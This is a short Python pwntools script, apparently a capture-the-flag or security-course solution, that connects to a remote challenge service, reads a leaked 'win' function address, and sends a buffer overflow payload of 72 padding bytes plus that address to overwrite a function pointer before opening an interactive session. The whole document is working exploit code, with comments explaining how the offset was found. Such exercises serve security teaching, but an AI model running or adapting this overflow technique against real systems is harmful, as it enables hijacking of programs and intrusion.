#!/usr/bin/env python3

from pwn import *

p = remote("6447.lol", 24224)

p.recvuntil(b"at ")
win_address = p.recvline().strip() # we read in the win address
win_address = int(win_address, 16) # and store it in an integer format

# payload = cyclic(200)

payload = b"A" * 72 # rax register was corrupted by 7016996846897815923, which by running `cyclic -l` returned an offset of 72
payload += p64(win_address) # insert win_address, overriding function pointer

p.sendlineafter(b"pointers work ?", payload)

p.interactive()